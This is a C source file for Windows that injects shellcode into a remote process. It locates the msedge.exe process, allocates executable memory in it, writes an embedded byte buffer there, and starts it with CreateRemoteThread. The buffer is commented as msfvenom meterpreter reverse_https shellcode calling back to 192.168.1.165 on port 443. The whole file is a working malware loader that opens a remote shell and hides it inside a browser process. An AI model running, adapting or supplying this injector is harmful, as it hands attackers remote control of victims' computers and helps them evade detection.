#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h> //needed for find_process

// thanks to https://github.com/AlionGreen/remote-thread-injection/blob/main/win32api/main.c
DWORD find_process(char *process_name){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &process_entry) == TRUE){
		
        	while (Process32Next(snapshot, &process_entry) == TRUE){
        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
				CloseHandle(snapshot);
				return process_entry.th32ProcessID;
            		}
        	}
    	}

	CloseHandle(snapshot);
	return 0;
}

int main()
{
    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.165 LPORT=443 EXITFUNC=thread -f c
    unsigned char buf[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x56\x48"
        "\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
        "\x66\x81\x78\x18\x0b\x02\x41\x51\x0f\x85\x72\x00\x00\x00\x8b"
        "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48"
        "\x18\x44\x8b\x40\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9"
        "\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
        "\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
        "\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
        "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69"
        "\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
        "\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
        "\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5"
        "\xe8\x0e\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e"
        "\x31\x36\x35\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00\x00"
        "\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f\xc6\x00"
        "\x00\x00\x00\xff\xd5\xe8\xde\x00\x00\x00\x2f\x4a\x32\x46\x33"
        "\x56\x71\x63\x56\x55\x6f\x69\x4c\x67\x49\x71\x43\x36\x62\x56"
        "\x76\x6a\x67\x48\x38\x37\x62\x75\x6d\x36\x6a\x6c\x4a\x52\x6b"
        "\x77\x39\x39\x33\x7a\x5a\x53\x35\x62\x52\x50\x6c\x65\x6c\x4f"
        "\x64\x50\x37\x52\x50\x39\x75\x6e\x6d\x73\x4d\x47\x51\x59\x37"
        "\x68\x34\x66\x32\x46\x63\x77\x69\x44\x74\x5a\x72\x33\x73\x42"
        "\x56\x37\x66\x63\x52\x4d\x55\x4f\x56\x69\x4b\x79\x44\x39\x47"
        "\x31\x53\x47\x4d\x45\x4d\x4e\x5f\x6b\x34\x34\x68\x6a\x69\x38"
        "\x75\x49\x68\x32\x76\x50\x6c\x38\x4a\x4a\x6d\x4d\x68\x73\x61"
        "\x51\x36\x2d\x77\x6c\x31\x61\x53\x72\x59\x63\x77\x7a\x7a\x56"
        "\x6c\x4c\x53\x4c\x37\x31\x31\x75\x4d\x5a\x38\x37\x64\x34\x31"
        "\x2d\x37\x74\x67\x4b\x4c\x6f\x51\x77\x4e\x78\x6b\x37\x38\x51"
        "\x55\x6e\x55\x41\x4a\x33\x58\x6a\x39\x64\x49\x44\x71\x70\x66"
        "\x4a\x49\x4b\x4c\x64\x49\x6e\x67\x77\x38\x4d\x51\x38\x4f\x6c"
        "\x64\x31\x39\x53\x5a\x50\x56\x7a\x4a\x71\x34\x76\x59\x6e\x50"
        "\x6b\x73\x35\x4d\x6d\x49\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d"
        "\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53"
        "\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a"
        "\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89"
        "\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00"
        "\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31"
        "\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75"
        "\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00"
        "\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00"
        "\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7"
        "\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
        "\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
        "\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89"
        "\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2"
        "\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00"
        "\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5";

    
    CHAR *target = "msedge.exe";
    DWORD pid = find_process(target);
    printf("Targeting process: %d \n", pid);

    HANDLE tHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    LPVOID rPtr = VirtualAllocEx(
        tHandle,
        NULL,
        sizeof(buf),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    BOOL bResult = WriteProcessMemory(
        tHandle,
        rPtr,
        buf,
        sizeof(buf),
        NULL
    );

    HANDLE hThread = CreateRemoteThread(
        tHandle,
        NULL,
        0,
        rPtr,
        NULL,
        0,
        NULL
    );

}